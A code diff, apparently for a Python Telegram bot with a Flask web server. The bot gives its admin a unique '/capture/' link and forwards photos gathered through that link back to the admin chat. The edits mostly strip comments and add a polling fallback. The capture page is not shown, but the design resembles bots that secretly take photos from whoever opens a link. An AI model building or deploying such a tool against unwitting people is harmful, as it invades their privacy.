@@ -15,9 +15,8 @@ from telegram.ext import Application, CommandHandler, ContextTypes
 # ================== پیکربندی ==================
 TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "YOUR_BOT_TOKEN")
 PUBLIC_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://your-app.onrender.com")
-ADMIN_CHAT_ID = None   # با اولین دستور /start پر می‌شود
+ADMIN_CHAT_ID = None
 
-# دیکشنری موقت برای نگهداری عکس‌های گرفته شده (توکن → بایت‌های JPEG)
 pending_photos = {}
 
 # ================== بخش Flask ==================
@@ -96,7 +95,7 @@ logger = logging.getLogger(__name__)
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global ADMIN_CHAT_ID
-    ADMIN_CHAT_ID = update.effective_chat.id   # چت ادمین ذخیره می‌شود
+    ADMIN_CHAT_ID = update.effective_chat.id
     capture_token = str(uuid.uuid4())
     link = f"{PUBLIC_URL}/capture/{capture_token}"
     keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("📸 گرفتن عکس", url=link)]])
@@ -106,7 +105,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 async def poll_photos(context: ContextTypes.DEFAULT_TYPE):
-    """بررسی عکس‌های جدید و ارسال به ادمین"""
     if not ADMIN_CHAT_ID:
         return
     to_remove = []
@@ -128,17 +126,24 @@ def run_flask():
     app.run(host="0.0.0.0", port=port)
 
 async def main():
-    # شروع ترد Flask
     flask_thread = Thread(target=run_flask, daemon=True)
     flask_thread.start()
 
-    # راه‌اندازی ربات تلگرام
+    # راه‌اندازی ربات با قابلیت JobQueue (نیازمند python-telegram-bot[job-queue])
     application = Application.builder().token(TOKEN).build()
     application.add_handler(CommandHandler("start", start))
 
-    # بررسی دوره‌ای عکس‌های جدید
     job_queue = application.job_queue
-    job_queue.run_repeating(poll_photos, interval=5, first=5)
+    if job_queue is None:
+        # در صورت عدم وجود JobQueue، یک راه جایگزین ساده با asyncio.create_task
+        logger.warning("JobQueue در دسترس نیست. از حلقه‌ی asyncio برای بررسی عکس‌ها استفاده می‌شود.")
+        async def background_poll():
+            while True:
+                await poll_photos(application)
+                await asyncio.sleep(5)
+        asyncio.create_task(background_poll())
+    else:
+        job_queue.run_repeating(poll_photos, interval=5, first=5)
 
     logger.info("ربات و وب سرور فعال شدند...")
     await application.run_polling()
